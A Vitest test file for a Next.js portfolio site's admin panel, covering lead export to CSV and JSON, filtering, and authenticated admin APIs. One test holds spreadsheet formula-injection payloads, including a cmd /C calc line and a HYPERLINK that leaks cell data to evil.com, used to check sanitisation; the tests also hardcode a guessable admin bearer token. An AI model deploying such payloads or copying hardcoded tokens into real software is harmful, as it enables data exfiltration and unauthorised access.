import { describe, it, expect } from "vitest";
import { NextRequest } from "next/server";
import {
  InquiryRecord,
  exportInquiriesToCsv,
  exportInquiriesToJson,
  filterInquiries,
  sanitizeCsvCell,
} from "../app/lib/admin-leads-exporter";
import { BlogPost } from "../app/data/portfolio-data";
import {
  GET as getAdminInquiries,
  PATCH as patchAdminInquiry,
  DELETE as deleteAdminInquiry,
} from "../app/api/admin/inquiries/route";
import {
  GET as getAdminProjects,
  POST as postAdminProject,
  PUT as putAdminProject,
  PATCH as patchAdminProject,
  DELETE as deleteAdminProject,
} from "../app/api/admin/projects/route";
import {
  GET as getAdminBlog,
  POST as postAdminBlog,
  PUT as putAdminBlog,
  PATCH as patchAdminBlog,
  DELETE as deleteAdminBlog,
} from "../app/api/admin/blog/route";
import { recordInboundInquiry } from "../app/lib/portfolio-store";

describe("Admin Panel & Inbound Lead Engine", () => {
  const sampleLeads: InquiryRecord[] = [
    {
      id: "inq-101",
      name: "Alex Sterling",
      email: "alex@sterlingventures.io",
      phone: "+1 (555) 019-2834",
      projectType: "Distributed Systems Architecture",
      budgetRange: "$15,000 – $30,000 (Full-Stack Platform)",
      message: "Need to scale PostgreSQL and Next.js 16 to 50k DAU with sub-30ms P99 latency.",
      status: "new",
      createdAt: "2026-10-26T10:00:00.000Z",
    },
    {
      id: "inq-102",
      name: "Elena Rostova",
      email: "elena@novatech.co",
      phone: "+44 20 7946 0912",
      projectType: "Database Optimization & High-Throughput Sprints",
      budgetRange: "$5,000 – $15,000 (MVP / Feature Sprint)",
      message: "Query execution timeout on multi-tenant PostgreSQL partition tables during surge hours.",
      status: "reviewed",
      createdAt: "2026-10-25T14:30:00.000Z",
    },
    {
      id: "inq-103",
      name: "Marcus Vance",
      email: "marcus@vancecloud.org",
      projectType: "Fractional Staff Software Engineer Retainer",
      budgetRange: "$10,000 / month",
      message: "Looking for an experienced distributed systems architect for 20 hrs/week fractional retainer.",
      status: "contacted",
      createdAt: "2026-10-24T09:15:00.000Z",
    },
  ];

  describe("RFC 4180 CSV Export & Anti-Formula Injection", () => {
    it("should export inquiries to RFC 4180 CSV with standard headers and CRLF line breaks", () => {
      const csv = exportInquiriesToCsv(sampleLeads);
      const lines = csv.split("\r\n");

      // Verify header row
      expect(lines[0]).toBe(
        '"Inquiry ID","Received Date (UTC)","Client Name","Email Address","Phone Number","Project Type","Budget Range","Status","Requirements Message"'
      );

      // Verify 3 data rows + 1 header row
      expect(lines.length).toBe(4);

      // Verify first lead row contents
      expect(lines[1]).toContain('"inq-101"');
      expect(lines[1]).toContain('"alex@sterlingventures.io"');
      expect(lines[1]).toContain('"Alex Sterling"');
      expect(lines[1]).toContain('"Distributed Systems Architecture"');
      expect(lines[1]).toContain('"new"');
    });

    it("should sanitize malicious spreadsheet formula injection (CWE-1236)", () => {
      // Exploit payloads trying to execute shell commands or exfiltrate data via spreadsheet formulas
      const maliciousLead: InquiryRecord = {
        id: "inq-exploit",
        name: "=cmd|' /C calc'!A0",
        email: "+malicious@payload.com",
        phone: "-123456789",
        projectType: "@SUM(1+1)*cmd|' /C notepad'!A0",
        budgetRange: "\t$25,000",
        message: "\r=HYPERLINK(\"http://evil.com/leak?data=\"&A1,\"Click Here\")",
        status: "new",
        createdAt: "2026-10-26T12:00:00.000Z",
      };

      const csv = exportInquiriesToCsv([maliciousLead]);

      // Every malicious formula character (=, +, -, @, \t, \r) must be neutralized with a leading single quote (')
      expect(csv).toContain("\"'=cmd|' /C calc'!A0\"");
      expect(csv).toContain("\"'+malicious@payload.com\"");
      expect(csv).toContain("\"'-123456789\"");
      expect(csv).toContain("\"'@SUM(1+1)*cmd|' /C notepad'!A0\"");
      expect(csv).toContain("\"'\t$25,000\"");
      expect(csv).toContain("\"'\n=HYPERLINK(\"\"http://evil.com/leak?data=\"\"&A1,\"\"Click Here\"\")\"");
    });

    it("should escape internal double quotes per RFC 4180 standard", () => {
      const leadWithQuotes: InquiryRecord = {
        id: "inq-quote",
        name: 'John "The Architect" Doe',
        email: "john@doe.com",
        projectType: 'Web "3.0" Platform',
        budgetRange: "$10,000",
        message: 'Client says: "Deliver in 4 weeks or else!"',
        status: "new",
        createdAt: "2026-10-26T12:00:00.000Z",
      };

      const csv = exportInquiriesToCsv([leadWithQuotes]);

      // Double quotes inside cells must become double double quotes ("")
      expect(csv).toContain('"John ""The Architect"" Doe"');
      expect(csv).toContain('"Web ""3.0"" Platform"');
      expect(csv).toContain('"Client says: ""Deliver in 4 weeks or else!"""');
    });

    it("should handle undefined and empty values safely without throwing", () => {
      expect(sanitizeCsvCell(undefined)).toBe('""');
      expect(sanitizeCsvCell(null)).toBe('""');
      expect(sanitizeCsvCell("")).toBe('""');
      expect(sanitizeCsvCell(12345)).toBe('"12345"');
    });
  });

  describe("JSON Export Engine", () => {
    it("should export inquiries to cleanly formatted JSON string", () => {
      const jsonStr = exportInquiriesToJson(sampleLeads);
      const parsed = JSON.parse(jsonStr);

      expect(Array.isArray(parsed)).toBe(true);
      expect(parsed.length).toBe(3);
      expect(parsed[0].id).toBe("inq-101");
      expect(parsed[0].name).toBe("Alex Sterling");
      expect(parsed[1].email).toBe("elena@novatech.co");
      expect(parsed[2].status).toBe("contacted");
    });
  });

  describe("Inbound Lead Filtering & Search", () => {
    it("should filter inquiries strictly by status", () => {
      const newOnly = filterInquiries(sampleLeads, "new", "");
      expect(newOnly.length).toBe(1);
      expect(newOnly[0].id).toBe("inq-101");

      const reviewedOnly = filterInquiries(sampleLeads, "reviewed", "");
      expect(reviewedOnly.length).toBe(1);
      expect(reviewedOnly[0].id).toBe("inq-102");

      const contactedOnly = filterInquiries(sampleLeads, "contacted", "");
      expect(contactedOnly.length).toBe(1);
      expect(contactedOnly[0].id).toBe("inq-103");

      const all = filterInquiries(sampleLeads, "all", "");
      expect(all.length).toBe(3);
    });

    it("should filter inquiries by free-text keywords across name, email, and message", () => {
      const byName = filterInquiries(sampleLeads, "all", "elena");
      expect(byName.length).toBe(1);
      expect(byName[0].name).toBe("Elena Rostova");

      const byDomain = filterInquiries(sampleLeads, "all", "sterlingventures.io");
      expect(byDomain.length).toBe(1);
      expect(byDomain[0].name).toBe("Alex Sterling");

      const byKeyword = filterInquiries(sampleLeads, "all", "retainer");
      expect(byKeyword.length).toBe(1);
      expect(byKeyword[0].id).toBe("inq-103");

      const noMatch = filterInquiries(sampleLeads, "all", "nonexistent-query-xyz");
      expect(noMatch.length).toBe(0);
    });

    it("should combine status filter with search keyword", () => {
      // Searching for "PostgreSQL" across all leads matches 2 leads (Alex and Elena)
      const allPostgres = filterInquiries(sampleLeads, "all", "PostgreSQL");
      expect(allPostgres.length).toBe(2);

      // Combining with status "new" should isolate only Alex
      const newPostgres = filterInquiries(sampleLeads, "new", "PostgreSQL");
      expect(newPostgres.length).toBe(1);
      expect(newPostgres[0].name).toBe("Alex Sterling");

      // Combining with status "contacted" should return empty
      const contactedPostgres = filterInquiries(sampleLeads, "contacted", "PostgreSQL");
      expect(contactedPostgres.length).toBe(0);
    });
  });

  describe("Blog Article Media Pipeline & Data Model", () => {
    it("should support coverImageUrl in BlogPost data model and validate URL format", () => {
      const samplePost: BlogPost = {
        id: "blog-test-1",
        title: "Scaling Edge Data Invalidation with Redis & Next.js 16",
        slug: "scaling-edge-data-invalidation",
        excerpt: "An architectural guide to cache invalidation strategies at global edge PoPs.",
        contentMarkdown: "## Architectural Overview\n\nCache invalidation is notoriously difficult...",
        tags: ["Architecture", "Redis", "Next.js"],
        readingTimeMinutes: 8,
        publishedAt: "2026-10-26T12:00:00.000Z",
        isPublished: true,
        coverImageUrl: "/uploads/cache-invalidation-architecture.webp",
      };

      expect(samplePost.coverImageUrl).toBeDefined();
      expect(samplePost.coverImageUrl).toMatch(/\.(webp|png|jpg|jpeg)$/i);
      expect(samplePost.coverImageUrl).not.toContain(".svg");
    });
  });

  describe("Protected Admin Inquiries API (/api/admin/inquiries)", () => {
    const authHeaders = {
      Authorization: "Bearer hanif2026",
      "Content-Type": "application/json",
    };

    it("should reject unauthenticated requests with 401 Unauthorized", async () => {
      const unauthReq = new NextRequest("http://localhost:3000/api/admin/inquiries");
      const res = await getAdminInquiries(unauthReq);
      expect(res.status).toBe(401);
      const json = await res.json();
      expect(json.success).toBe(false);
      expect(json.error).toContain("Unauthorized");
    });

    it("should allow authenticated admin to retrieve inquiries list", async () => {
      // First ensure at least one test inquiry is recorded
      await recordInboundInquiry({
        name: "Test Lead Admin",
        email: "lead.admin@enterprise.io",
        projectType: "Full-Stack Architecture",
        budgetRange: "$15,000+",
        message: "Requesting full architectural review for multi-tenant platform.",
      });

      const req = new NextRequest("http://localhost:3000/api/admin/inquiries", {
        headers: authHeaders,
      });
      const res = await getAdminInquiries(req);
      expect(res.status).toBe(200);

      const json = await res.json();
      expect(json.success).toBe(true);
      expect(Array.isArray(json.inquiries)).toBe(true);
      expect(json.inquiries.length).toBeGreaterThanOrEqual(1);

      const target = json.inquiries.find((i: any) => i.email === "lead.admin@enterprise.io");
      expect(target).toBeDefined();
      expect(target.name).toBe("Test Lead Admin");
    });

    it("should allow authenticated admin to update inquiry status via PATCH", async () => {
      const newLead = await recordInboundInquiry({
        name: "Status Test Client",
        email: "status.test@acme.org",
        projectType: "PostgreSQL Audit",
        budgetRange: "$11,000",
        message: "High concurrency audit request.",
      });

      const patchReq = new NextRequest("http://localhost:3000/api/admin/inquiries", {
        method: "PATCH",
        headers: authHeaders,
        body: JSON.stringify({
          id: newLead.id,
          status: "in_discussion",
          notes: "Scheduled initial technical discovery call.",
        }),
      });

      const res = await patchAdminInquiry(patchReq);
      expect(res.status).toBe(200);

      const json = await res.json();
      expect(json.success).toBe(true);
      expect(json.inquiry.status).toBe("in_discussion");
    });

    it("should allow authenticated admin to delete an inquiry via DELETE", async () => {
      const leadToDelete = await recordInboundInquiry({
        name: "Spam Inquiry Candidate",
        email: "spam@randomdomain.test",
        projectType: "Spam Scope",
        budgetRange: "$0",
        message: "Spam message payload.",
      });

      const deleteReq = new NextRequest(
        `http://localhost:3000/api/admin/inquiries?id=${leadToDelete.id}`,
        {
          method: "DELETE",
          headers: authHeaders,
        }
      );

      const res = await deleteAdminInquiry(deleteReq);
      expect(res.status).toBe(200);

      const json = await res.json();
      expect(json.success).toBe(true);
      expect(json.message).toContain("deleted");
    });
  });

  describe("Protected Admin Projects API (/api/admin/projects)", () => {
    const authHeaders = {
      Authorization: "Bearer hanif2026",
      "Content-Type": "application/json",
    };

    it("should reject unauthenticated requests with 401 Unauthorized", async () => {
      const unauthReq = new NextRequest("http://localhost:3000/api/admin/projects");
      const res = await getAdminProjects(unauthReq);
      expect(res.status).toBe(401);
    });

    it("should create, read, update, toggle, and delete a project via authenticated API", async () => {
      // 1. CREATE via POST
      const postReq = new NextRequest("http://localhost:3000/api/admin/projects", {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify({
          title: "Real-Time Telemetry & Observability Pipeline",
          slug: "realtime-telemetry-observability",
          summary: "Distributed OpenTelemetry pipeline streaming 100k events/sec into ClickHouse.",
          descriptionMarkdown: "Comprehensive distributed tracing and metrics ingestion architecture.",
          clientName: "FinTech Global",
          priceTag: "$16,500 Scope",
          impactMetric: "100k events/sec at <5ms ingestion latency",
          techStack: ["Next.js 16", "ClickHouse", "Kafka", "TypeScript"],
          isFeatured: true,
          published: true,
        }),
      });

      const createRes = await postAdminProject(postReq);
      expect(createRes.status).toBe(200);
      const createJson = await createRes.json();
      expect(createJson.success).toBe(true);
      expect(createJson.project.slug).toBe("realtime-telemetry-observability");
      const projectId = createJson.project.id;

      // 2. READ via GET
      const getReq = new NextRequest("http://localhost:3000/api/admin/projects", {
        headers: authHeaders,
      });
      const getRes = await getAdminProjects(getReq);
      expect(getRes.status).toBe(200);
      const getJson = await getRes.json();
      expect(getJson.projects.some((p: any) => p.id === projectId)).toBe(true);

      // 3. UPDATE via PUT
      const putReq = new NextRequest("http://localhost:3000/api/admin/projects", {
        method: "PUT",
        headers: authHeaders,
        body: JSON.stringify({
          id: projectId,
          priceTag: "$18,000 Scope",
          impactMetric: "120k events/sec at <4ms ingestion latency",
        }),
      });
      const putRes = await putAdminProject(putReq);
      expect(putRes.status).toBe(200);
      const putJson = await putRes.json();
      expect(putJson.project.priceTag).toBe("$18,000 Scope");

      // 4. TOGGLE via PATCH
      const patchReq = new NextRequest("http://localhost:3000/api/admin/projects", {
        method: "PATCH",
        headers: authHeaders,
        body: JSON.stringify({
          id: projectId,
          action: "toggle_published",
        }),
      });
      const patchRes = await patchAdminProject(patchReq);
      expect(patchRes.status).toBe(200);
      const patchJson = await patchRes.json();
      expect(patchJson.project.published).toBe(false);

      // 5. DELETE via DELETE
      const deleteReq = new NextRequest(
        `http://localhost:3000/api/admin/projects?id=${projectId}`,
        {
          method: "DELETE",
          headers: authHeaders,
        }
      );
      const deleteRes = await deleteAdminProject(deleteReq);
      expect(deleteRes.status).toBe(200);
      const deleteJson = await deleteRes.json();
      expect(deleteJson.success).toBe(true);
    });
  });

  describe("Protected Admin Blog API (/api/admin/blog)", () => {
    const authHeaders = {
      Authorization: "Bearer hanif2026",
      "Content-Type": "application/json",
    };

    it("should reject unauthenticated requests with 401 Unauthorized", async () => {
      const unauthReq = new NextRequest("http://localhost:3000/api/admin/blog");
      const res = await getAdminBlog(unauthReq);
      expect(res.status).toBe(401);
    });

    it("should create, read, update, toggle, and delete an article via authenticated API", async () => {
      // 1. CREATE via POST
      const postReq = new NextRequest("http://localhost:3000/api/admin/blog", {
        method: "POST",
        headers: authHeaders,
        body: JSON.stringify({
          title: "Designing Zero-Downtime Distributed Migrations",
          slug: "zero-downtime-distributed-migrations",
          excerpt: "How to perform blue-green database schema migrations without locking active rows.",
          contentMarkdown: "## Zero-Downtime Patterns\n\nDual-writing with shadow reads...",
          tags: ["Architecture", "PostgreSQL", "Database"],
          readingTimeMinutes: 7,
          isPublished: true,
        }),
      });

      const createRes = await postAdminBlog(postReq);
      expect(createRes.status).toBe(200);
      const createJson = await createRes.json();
      expect(createJson.success).toBe(true);
      expect(createJson.post.slug).toBe("zero-downtime-distributed-migrations");
      const postId = createJson.post.id;

      // 2. READ via GET
      const getReq = new NextRequest("http://localhost:3000/api/admin/blog", {
        headers: authHeaders,
      });
      const getRes = await getAdminBlog(getReq);
      expect(getRes.status).toBe(200);
      const getJson = await getRes.json();
      expect(getJson.posts.some((p: any) => p.id === postId)).toBe(true);

      // 3. UPDATE via PUT
      const putReq = new NextRequest("http://localhost:3000/api/admin/blog", {
        method: "PUT",
        headers: authHeaders,
        body: JSON.stringify({
          id: postId,
          readingTimeMinutes: 9,
          excerpt: "Updated guide on zero-downtime schema migrations for high-write databases.",
        }),
      });
      const putRes = await putAdminBlog(putReq);
      expect(putRes.status).toBe(200);
      const putJson = await putRes.json();
      expect(putJson.post.readingTimeMinutes).toBe(9);

      // 4. TOGGLE via PATCH
      const patchReq = new NextRequest("http://localhost:3000/api/admin/blog", {
        method: "PATCH",
        headers: authHeaders,
        body: JSON.stringify({
          id: postId,
          action: "toggle_published",
        }),
      });
      const patchRes = await patchAdminBlog(patchReq);
      expect(patchRes.status).toBe(200);
      const patchJson = await patchRes.json();
      expect(patchJson.post.isPublished).toBe(false);

      // 5. DELETE via DELETE
      const deleteReq = new NextRequest(
        `http://localhost:3000/api/admin/blog?id=${postId}`,
        {
          method: "DELETE",
          headers: authHeaders,
        }
      );
      const deleteRes = await deleteAdminBlog(deleteReq);
      expect(deleteRes.status).toBe(200);
      const deleteJson = await deleteRes.json();
      expect(deleteJson.success).toBe(true);
    });
  });
});
